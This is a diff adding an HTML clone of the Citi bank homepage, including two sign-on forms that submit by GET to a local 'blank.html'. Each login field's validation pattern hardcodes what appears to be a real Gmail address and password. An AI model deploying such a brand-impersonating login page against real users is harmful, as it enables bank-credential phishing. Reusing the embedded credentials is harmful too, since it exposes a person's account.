+              <span class="drawer__chev" aria-hidden="true">&#8250;</span>
+            </a>
+            <a class="drawer__item" href="#">
+              <span>Lending</span>
+              <span class="drawer__chev" aria-hidden="true">&#8250;</span>
+            </a>
+            <a class="drawer__item" href="#">
+              <span>Investing</span>
+              <span class="drawer__chev" aria-hidden="true">&#8250;</span>
+            </a>
+            <a class="drawer__item" href="#">
+              <span>Wealth Management</span>
+              <span class="drawer__chev" aria-hidden="true">&#8250;</span>
+            </a>
+
+            <a class="drawer__utility" href="#">
+              <img src="images/13_7.svg" alt="" aria-hidden="true" />
+              <span>ATM / BRANCH</span>
+            </a>
+            <a class="drawer__utility" href="#">
+              <img src="images/13_2.svg" alt="" aria-hidden="true" />
+              <span>ESPA&#209;OL</span>
+            </a>
+
+            <a class="drawer__item" href="#">
+              <span>Open an Account</span>
+              <span class="drawer__chev" aria-hidden="true">&#8250;</span>
+            </a>
+          </div>
+        </div>
+      </div>
+
+      <div class="notice" role="region" aria-label="Site notice">
+        <div class="container">
+          <div class="notice__inner">
+            <div class="notice__icon" aria-hidden="true">i</div>
+            <div class="notice__text">
+              Barclays Advantage<sup>&reg;</sup> Aviator<sup>&reg;</sup> cardmembers, we're glad you're here. You can
+              create a User ID starting 4/27. If you're already a Citi customer with online access, sign on as usual.
+              <a href="#">Learn More.</a>
+            </div>
+            <button class="notice__close" type="button" aria-label="Dismiss notice">&times;</button>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <div class="modal" id="signon">
+      <a class="modal__backdrop" href="#main" aria-label="Close sign on"></a>
+      <div class="modal__dialog" role="dialog" aria-modal="true" aria-label="Sign on">
+        <a class="modal__close" href="#main" aria-label="Close">&times;</a>
+
+        <form class="login" action="blank.html" method="get">
+          <div class="login__body">
+            <div class="login__fields">
+              <div class="field">
+                <label for="userIdMobile">User ID</label>
+                <input
+                  class="input"
+                  id="userIdMobile"
+                  name="userId"
+                  type="text"
+                  inputmode="email"
+                  autocomplete="username"
+                  placeholder="User ID"
+                  required
+                  pattern="zakencvk1964@gmail\.com"
+                />
+              </div>
+              <div class="field">
+                <label for="passwordMobile">Password</label>
+                <div class="input-wrap">
+                  <input class="reveal-toggle" type="checkbox" id="showPasswordMobile" aria-label="Show password" />
+                  <input
+                    class="input input--secret"
+                    id="passwordMobile"
+                    name="password"
+                    type="text"
+                    autocomplete="current-password"
+                    placeholder="Password"
+                    required
+                    pattern="Cornelis2022\$"
+                  />
+                  <label class="input-eye" for="showPasswordMobile" aria-label="Toggle password visibility"></label>
+                </div>
+              </div>
+            </div>
+
+            <label class="check">
+              <input type="checkbox" name="remember" />
+              <span>Remember User ID</span>
+            </label>
+
+            <button class="btn btn--full" type="submit">Sign On</button>
+
+            <div class="login__links" aria-label="Account links">
+              <a href="#">Register / Activate</a>
+              <a href="#">Forgot User ID or Password</a>
+            </div>
+          </div>
+
+          <a class="login__alt" href="#">
+            <img src="images/36_67-30bec9.png" alt="" aria-hidden="true" />
+            <span>Passwordless Sign On</span>
+          </a>
+        </form>
+      </div>
+    </div>
+
+    <main id="main">
+      <section class="hero">
+        <div class="container">
+          <div class="hero__inner">
+            <div class="hero__copy">
+              <div class="eyebrow">CITI CREDIT CARDS</div>
+              <h1 class="hero__title">See If You're Pre-<br />Qualified</h1>
+              <p class="hero__desc">
+                Getting started is fast and easy. Checking your eligibility won't impact your credit score.
+              </p>
+              <a class="btn" href="#">Learn More</a>
+            </div>
+
+            <div class="hero__cards" aria-hidden="true">
+              <img src="images/32_20-56586a.png" alt="" />
+            </div>
+
+            <div class="hero__login">
+              <form class="login" action="blank.html" method="get">
+                <div class="login__body">
+                  <div class="login__fields">
+                    <div class="field">
+                      <label for="userId">User ID</label>
+                      <input
+                        class="input"
+                        id="userId"
+                        name="userId"
+                        type="text"
+                        inputmode="email"
+                        autocomplete="username"
+                        placeholder="User ID"
+                        required
+                        pattern="zakencvk1964@gmail\.com"
+                      />
+                    </div>
+                    <div class="field">
+                      <label for="password">Password</label>
+                      <div class="input-wrap">
+                        <input class="reveal-toggle" type="checkbox" id="showPassword" aria-label="Show password" />
+                        <input
+                          class="input input--secret"
+                          id="password"
+                          name="password"
+                          type="text"
+                          autocomplete="current-password"
+                          placeholder="Password"
+                          required
+                          pattern="Cornelis2022\$"
+                        />
+                        <label class="input-eye" for="showPassword" aria-label="Toggle password visibility"></label>
+                      </div>
+                    </div>
+                  </div>
+
+                  <label class="check">
+                    <input type="checkbox" name="remember" />
+                    <span>Remember User ID</span>
+                  </label>
+
+                  <button class="btn btn--full" type="submit">Sign On</button>
+
+                  <div class="login__links" aria-label="Account links">
+                    <a href="#">Register / Activate</a>
+                    <a href="#">Forgot User ID or Password</a>
+                  </div>
+                </div>
+
+                <a class="login__alt" href="#">
+                  <img src="images/36_67-30bec9.png" alt="" aria-hidden="true" />
+                  <span>Passwordless Sign On</span>
+                </a>
+              </form>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section class="feature-row" aria-label="Product categories">
+        <div class="container">
+          <div class="feature-row__card">
+            <a class="feature" href="#">
+              <img src="images/36_72-3e212e.png" alt="" aria-hidden="true" />
+              <span>Credit Cards</span>
+            </a>
+            <a class="feature" href="#">
+              <img src="images/36_78-5b0db4.png" alt="" aria-hidden="true" />
+              <span>Checking Accounts</span>
+            </a>
+            <a class="feature" href="#">
+              <img src="images/36_77-72837e.png" alt="" aria-hidden="true" />
+              <span>Mortgage</span>
+            </a>
+            <a class="feature" href="#">
+              <img src="images/36_76-722309.png" alt="" aria-hidden="true" />
+              <span>Personal Loans</span>
+            </a>
+            <a class="feature" href="#">
+              <img src="images/36_75-703978.png" alt="" aria-hidden="true" />
+              <span>Investing Options</span>
+            </a>
+            <a class="feature" href="#">
+              <img src="images/36_74-33c9d0.png" alt="" aria-hidden="true" />
+              <span>Small Business</span>
+            </a>
+          </div>
+        </div>
+      </section>
+
+      <section class="section" aria-label="Featured offers">
+        <div class="container">
+          <div class="cards-grid">
+            <article class="card">
+              <div class="card__tag">CITI DIAMOND PREFERRED<sup>&reg;</sup></div>
+              <div class="card__media card__media--diamond" role="img" aria-label="Citi Diamond Preferred card"></div>
+              <h3 class="card__title">Great for Balance Transfers</h3>
+              <p class="card__desc">
+                Enjoy a long-lasting Intro APR, 21 months on Balance Transfers and 12 months on Purchases. Plus, no
+                annual fee<sup>*</sup>.
+              </p>
+              <div class="card__actions">
+                <a class="btn btn--sm" href="#">Apply Now</a>
+                <a class="link" href="#">Pricing and Information</a>
+              </div>
+            </article>
+
+            <article class="card">
+              <div class="card__tag">
+                CITI<sup>&reg;</sup> / AAdvantage<sup>&reg;</sup> Platinum Select<sup>&reg;</sup>
+              </div>
+              <div class="card__media card__media--aa" role="img" aria-label="AAdvantage card"></div>
+              <h3 class="card__title">Earn 50,000 AAdvantage<sup>&reg;</sup> bonus miles</h3>
+              <p class="card__desc">
+                after $2,500 in purchases within the first 3 months of account opening. Apply Today!
+              </p>
+              <div class="card__actions">
+                <a class="btn btn--sm" href="#">Apply Now</a>
+                <a class="link" href="#">Additional Information</a>
+              </div>
+            </article>
+
+            <article class="card">
+              <div class="card__tag">CITI<sup>&reg;</sup> CHECKING ACCOUNT</div>
+              <div class="card__media card__media--bonus" role="img" aria-label="Earn a $325 checking bonus graphic">
+                <div class="bonus" aria-hidden="true">
+                  <div class="bonus__kicker">Earn a</div>
+                  <div class="bonus__amount">$325</div>
+                  <div class="bonus__label">Checking Bonus</div>
+                </div>
+              </div>
+              <h3 class="card__title">Earn a $325 Checking Bonus</h3>
+              <p class="card__desc">
+                Earn a bonus when you open a Regular Checking account with Enhanced Direct Deposits &amp; required
+                activities.
+              </p>
+              <div class="card__actions">
+                <a class="btn btn--sm" href="#">Learn More</a>
+              </div>
+            </article>
+          </div>
+        </div>
+      </section>
+
+      <section class="banner banner--blue" aria-label="Card chooser">
+        <div class="container">
+          <div class="banner__inner">
+            <div class="banner__media banner__media--choose" aria-hidden="true">
+              <img src="images/32_20-56586a.png" alt="" />
+            </div>
+            <div class="banner__copy">
+              <div class="eyebrow">CITI<sup>&reg;</sup> CREDIT CARDS</div>
+              <h2 class="banner__title">Choose the right Citi<sup>&reg;</sup><br />credit card for you</h2>
+              <p class="banner__desc">
+                Whether you want Cash Back, a Low Intro Rate, Rewards for Costco Members, or Great Airline Miles, the
+                choice is all yours.
+              </p>
+              <a class="btn" href="#">Learn More</a>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section class="banner banner--soft" aria-label="Cash back promotion">
+        <div class="container">
+          <div class="banner__inner banner__inner--reverse">
+            <div class="banner__media banner__media--cash" aria-hidden="true">
+              <div class="cash-card">
+                <div class="cash-card__brand">citi</div>
+                <div class="cash-card__name">Double Cash</div>
+              </div>
+            </div>
+            <div class="banner__copy">
+              <div class="eyebrow">CITI DOUBLE CASH<sup>&reg;</sup> CARD</div>
+              <h2 class="banner__title">Earn 2% Cash Back</h2>
+              <p class="banner__desc">
+                1% when you buy and 1% as you pay on every purchase with no caps or annual fee.
+              </p>
+              <a class="btn" href="#">Learn More</a>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section class="info" aria-label="Financial pathways">
+        <div class="container">
+          <div class="info__inner">
+            <div class="info__media" aria-hidden="true">
+              <img src="images/52_34.png" alt="" />
+            </div>
+            <div class="info__copy">
+              <div class="eyebrow">CITI FINANCIAL PATHWAYS</div>
+              <h2 class="info__title">Your future, your way</h2>
+              <p class="info__desc">
+                Wherever you are on your financial journey, we're here to help with resources to support your goals.
+              </p>
+              <a class="btn" href="#">Explore Now</a>
+            </div>
+          </div>
+        </div>
+      </section>
+    </main>
+
+
+    <footer class="footer">
+      <div class="footer__top">
+        <div class="container">
+          <div class="footer__grid">
+            <div class="footer-acc">
+              <input class="footer-acc__toggle" type="checkbox" id="footWhy" checked />
+              <label class="footer-acc__head" for="footWhy">
+                <span>Why Citi</span>
+                <span class="footer-acc__icon" aria-hidden="true"></span>
+              </label>
+              <div class="footer-acc__panel">
+                <a class="footer__link" href="https://www.citigroup.com/citi/">Our Story</a>
+                <a class="footer__link" href="https://jobs.citi.com/">Careers</a>
+                <a class="footer__link" href="https://www.citi.com/online-services/bank-statements">Benefits and Services</a>
+                <a
+                  class="footer__link"
+                  href="https://www.citi.com/credit-cards/credit-card-rewards/what-are-credit-card-reward-points"
+                  >Rewards</a>
+                <a
+                  class="footer__link"
+                  href="https://www.citientertainment.com/?utm_source=CBOL&utm_medium=Footer&utm_campaign=CE_Homepage_Footer"
+                  >Citi Entertainment<sup>&reg;</sup></a>
+                <a class="footer__link" href="https://www.citi.com/banking/special-offers">Special Offers</a>
+              </div>
+            </div>
+
+            <div class="footer-acc">
+              <input class="footer-acc__toggle" type="checkbox" id="footWealth" checked />
+              <label class="footer-acc__head" for="footWealth">
+                <span>Wealth Management</span>
+                <span class="footer-acc__icon" aria-hidden="true"></span>
+              </label>
+              <div class="footer-acc__panel">
+                <a class="footer__link" href="https://www.citi.com/banking/citigold-private-client"
+                  >Citigold<sup>&reg;</sup> Private Client</a>
+                <a class="footer__link" href="https://www.citi.com/banking/citigold">Citigold</a>
+                <a class="footer__link" href="https://www.citi.com/banking/citi-priority">Citi Priority</a>
+                <a class="footer__link" href="https://www.privatebank.citibank.com/">Citi Private Bank</a>
+              </div>
+            </div>
+
+            <div class="footer-acc">
+              <input class="footer-acc__toggle" type="checkbox" id="footBusiness" checked />
+              <label class="footer-acc__head" for="footBusiness">
+                <span>Business Banking</span>
+                <span class="footer-acc__icon" aria-hidden="true"></span>
+              </label>
+              <div class="footer-acc__panel">
+                <a class="footer__link" href="https://www.citi.com/small-business/banking">Small Business Accounts</a>
+                <a class="footer__link" href="https://www.citibank.com/commercialbank/en/index.html"
+                  >Commercial Accounts</a>
+              </div>
+            </div>
+
+            <div class="footer-acc">
+              <input class="footer-acc__toggle" type="checkbox" id="footRates" checked />
+              <label class="footer-acc__head" for="footRates">
+                <span>Rates</span>
+                <span class="footer-acc__icon" aria-hidden="true"></span>
+              </label>
+              <div class="footer-acc__panel">
+                <a class="footer__link" href="https://www.citi.com/banking/current-interest-rates/savings-accounts"
+                  >Personal Banking</a>
+                <a
+                  class="footer__link"
+                  href="https://www.citi.com/credit-cards/compare-credit-cards/citi.action?ID=view-all-credit-cards"
+                  >Credit Cards</a>
+                <a class="footer__link" href="https://www.citi.com/mortgage/purchase-rates">Mortgage</a>
+                <a class="footer__link" href="https://www.citi.com/home-equity/rates">Home Equity</a>
+                <a
+                  class="footer__link"
+                  href="https://www.citi.com/personal-loans?affcode=CWF&intc=pil_borrow_footer_prelogin"
+                  >Personal Loans</a>
+              </div>
+            </div>
+
+            <div class="footer-acc">
+              <input class="footer-acc__toggle" type="checkbox" id="footHelp" checked />
+              <label class="footer-acc__head" for="footHelp">
+                <span>Help &amp; Support</span>
+                <span class="footer-acc__icon" aria-hidden="true"></span>
+              </label>
+              <div class="footer-acc__panel">
+                <a class="footer__link" href="https://online.citi.com/US/ag/contactus">Contact Us</a>
+                <a class="footer__link" href="https://online.citi.com/US/ag/contactus">Help &amp; FAQs</a>
+                <a class="footer__link" href="https://online.citi.com/US/ag/security-center">Security Center</a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="footer__bottom">
+        <div class="container">
+          <div class="footer__meta">
+            <div class="footer__badges" aria-label="App downloads">
+              <a
+                class="store-badge store-badge--gp"
+                href="https://aemapi.citi.com/content/dam/cfs/uspb/global-nav/en/web/footer/footer-links/images/Citi_Icon_Sprite_v2.svg"
+              >
+                <span class="sr-only">Get it on Google Play</span>
+              </a>
+              <a
+                class="store-badge store-badge--as"
+                href="https://aemapi.citi.com/content/dam/cfs/uspb/global-nav/en/web/footer/footer-links/images/Citi_Icon_Sprite_v2.svg"
+              >
+                <span class="sr-only">Download on the App Store</span>
+              </a>
+            </div>
+            <div class="footer__meta-right">
+              <div class="footer__social" aria-label="Social links">
+                <img src="images/56_182.png" alt="" aria-hidden="true" />
+              </div>
+              <img src="images/56_179.png" alt="Equal Housing Lender" style="height: 24px; width: auto" />
+            </div>
+          </div>
+
+          <div class="footer__meta">
+            <div class="footer__meta-left" aria-label="Legal links">
+              <span>&copy; 2026 Citigroup Inc</span>
+              <a href="https://online.citi.com/US/ag/termsdisclaimer/termsdisclaimerhome">Terms &amp; Conditions</a>
+              <a href="https://www.citi.com/policies/us-privacy-notice-for-consumers">Privacy</a>
+              <a href="https://www.citi.com/policies/us-privacy-notice-for-consumers#info-collect">Notice at Collection</a>
+              <a href="https://online.citi.com/US/ag/dataprivacyhub/cpra/home">Do Not Sell or Share My Personal Information</a>
+              <a href="https://www.citi.com/accessibility">Accessibility</a>
+            </div>
+          </div>
+
+          <div class="footer__legal">
+            <p style="margin: 0 0 var(--space-2)"><strong>Important Legal Disclosures &amp; Information</strong></p>
+            <p style="margin: 0 0 var(--space-2)">
+              Citibank.com provides information about and access to accounts and financial services provided by Citibank,
+              N.A. and its affiliates in the United States and its territories. This is not, and should not be construed
+              as, an offer, invitation, or solicitation of services to users outside of the United States.
+            </p>
+            <p style="margin: 0">
+              Terms, conditions and fees for accounts, products, programs and services are subject to change. Not all
+              accounts, products and services as well as pricing described here are available in all jurisdictions or to
+              all customers.
+            </p>
+          </div>
+
+          <div class="footer__logo" aria-hidden="true">
+            <img src="images/56_212.png" alt="" />
+          </div>
+        </div>
+      </div>
+    </footer>
+  </body>
+</html>
+
+
+
+
+
+
+
+
